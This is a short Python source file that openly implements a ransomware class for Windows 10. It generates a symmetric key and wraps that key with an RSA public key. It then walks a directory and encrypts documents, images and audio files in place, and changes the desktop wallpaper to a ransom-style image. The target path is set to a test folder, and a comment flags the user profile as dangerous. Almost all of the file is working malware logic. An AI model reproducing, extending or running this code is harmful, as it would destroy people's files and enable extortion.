from cryptography.fernet import Fernet
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import os
import tkinter
import ctypes



class Ransomware:
    """Ransomware class for windows 10 systems"""
    
    
    file_extensions = ['.txt', '.pdf', '.png', '.jpeg', '.docx', '.xlsx', '.doc', '.rtf', '.mp3']

    def __init__(self):
        self.fernetkey = None
        self.publickey = None
        self.encryptor = None
        self.localpath = 'target'   # os.environ['USERPROFILE'] DANGER  DANGER DANGER


    def create_fernet_key(self):
        self.fernetkey = Fernet.generate_key()
        self.encryptor = Fernet(self.fernetkey)
    

    def encrypt_fernet_key(self):
        # Import public key to encrypt and save fernet key to file.key
        with open('public.pem', 'rb') as f:
            self.publickey = RSA.import_key(f.read())
            
        PKenc = PKCS1_OAEP.new(self.publickey)
        with open('fernet.key', 'wb') as f:
            f.write(PKenc.encrypt(self.fernetkey))
        

    def encrypt_os(self):
        for root, dirs, files in os.walk(self.localpath):
            for file in files:
                ext = os.path.splitext(file)[-1].lower()
                if ext in self.file_extensions:
                    filepath = os.path.join(root, file)
                    self.encrypt_file(filepath)
                    print('Encrypted: ', filepath)

                    # self.decrypt_file(filepath)
                    # print('file decrypted: ', filepath)

    
    def encrypt_file(self, file):
        with open(file, 'rb') as readf:
            content = readf.read()

        with open(file, 'wb') as writef:
            writef.write(self.encryptor.encrypt(content))
        

    def decrypt_file(self, file):
        with open(file, 'rb') as readf:
            contents = readf.read()

        with open(file, 'wb') as writef:
            decfile = self.encryptor.decrypt(contents)
            writef.write(decfile)
            print('decrypted :', file)


    

    def display_message(self):
        return
    
    def update_background(self):
        ctypes.windll.user32.SystemParametersInfoW(20, 0, 'C:\\Users\\jerry\\Documents\\pyransomware\\pirate.png', 0)
        


# Without GUI:
# malware = Ransomware()
# malware.create_fernet_key()
# malware.encrypt_fernet_key()
# malware.encrypt_os()
# malware.update_background()